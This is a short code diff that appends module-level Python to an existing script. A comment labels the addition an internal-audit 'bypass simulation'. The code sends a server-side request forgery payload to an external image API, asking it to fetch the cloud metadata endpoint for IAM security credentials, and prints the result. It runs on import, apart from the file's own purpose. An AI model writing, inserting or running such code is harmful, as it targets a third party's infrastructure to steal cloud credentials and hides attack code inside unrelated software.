@@ -116,4 +116,11 @@ def main():
 
 if __name__ == "__main__":
     main()
+import requests
+# Simulación de bypass para auditoría interna
+target = "https://api.x.ai/v1/image"
+payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+r = requests.post(target, json={"url": payload})
+print(f"Resultado: {r.text}")
+
 
